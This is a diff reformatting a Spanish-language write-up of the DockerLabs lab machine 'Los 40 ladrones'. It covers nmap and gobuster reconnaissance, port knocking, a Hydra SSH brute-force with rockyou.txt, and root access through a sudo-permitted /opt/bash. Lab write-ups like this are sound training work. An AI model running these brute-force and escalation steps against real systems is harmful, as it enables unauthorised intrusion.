@@ -1,22 +1,30 @@
-# 🖥️ Writeup - Los 40 ladrones 
+---
+icon: linux
+---
 
-**Plataforma:** Dockerlabs  
-**Sistema Operativo:** Linux  
+# Los 40 ladrones ​​
 
-> **Tags:** `Linux` `Web` `Gobuster` `Port Knocking` `Hydra` `Brute Force` `Sudoers` 
+## 🖥️ Writeup - Los 40 ladrones
 
-# INSTALACIÓN
+**Plataforma:** Dockerlabs\
+**Sistema Operativo:** Linux
+
+> **Tags:** `Linux` `Web` `Gobuster` `Port Knocking` `Hydra` `Brute Force` `Sudoers`
+
+## INSTALACIÓN
 
 Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.
 
-```bash 
+```bash
 unzip los40ladrones.zip
 ```
+
 La máquina ya está descomprimida y solo falta montarla.
 
 ```bash
 sudo bash auto_deploy.sh los40ladrones.tar
-``` 
+```
+
 Info:
 
 ```
@@ -41,23 +49,24 @@ Estamos desplegando la máquina vulnerable, espere un momento.
 Máquina desplegada, su dirección IP es --> 172.17.0.2
 
 Presiona Ctrl+C cuando termines con la máquina para eliminarla
-``` 
+```
 
 Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.
 
-# ESCANEO DE PUERTOS
+## ESCANEO DE PUERTOS
 
 A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 ```bash
 nmap -n -Pn -sCV -p80 --min-rate 5000 172.17.0.2
 ```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:11 CET
 Nmap scan report for 172.17.0.2
@@ -77,7 +86,7 @@ Identificamos que únicamente el puerto `80` está abierto.
 
 Accedemos al servicio web del puerto `80` y nos encontramos con una página por defecto de `Apache2`.
 
-# GOBUSTER 
+## GOBUSTER
 
 Realizamos `fuzzing` de directorios para intentar localizar directorios o archivos ocultos.
 
@@ -86,6 +95,7 @@ gobuster dir -u http://172.17.0.2 -w /usr/share/seclists/Discovery/Web-Content/D
 ```
 
 Info:
+
 ```
 ===============================================================
 Gobuster v3.8
@@ -125,9 +135,10 @@ Volvemos a escanear los puertos para comprobar si se ha abierto alguno nuevo.
 
 ```bash
 nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
-``` 
+```
 
 Info:
+
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:20 CET
 Nmap scan report for 172.17.0.2
@@ -146,7 +157,7 @@ Nmap done: 1 IP address (1 host up) scanned in 32.76 seconds
 
 Y efectivamente, el puerto `22` (SSH) ahora está accesible.
 
-# HYDRA
+## HYDRA
 
 En el mensaje anterior se hacía referencia a `toctoc` como un posible usuario, por lo que intentamos un ataque de `fuerza bruta` contra el servicio `SSH`.
 
@@ -155,6 +166,7 @@ hydra -l toctoc -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -f -I
 ```
 
 Info:
+
 ```
 Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -175,7 +187,7 @@ Accedemos por `SSH`.
 ssh toctoc@172.17.0.2
 ```
 
-# ESCALADA DE PRIVILEGIOS
+## ESCALADA DE PRIVILEGIOS
 
 Una vez dentro, comprobamos permisos `sudo` y `SUID`.
 
@@ -184,6 +196,7 @@ sudo -l
 ```
 
 Info:
+
 ```
 Matching Defaults entries for toctoc on 7869897be703:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
@@ -200,6 +213,7 @@ sudo /opt/bash
 ```
 
 Info:
+
 ```
 root@7869897be703:/home/toctoc# whoami
 root
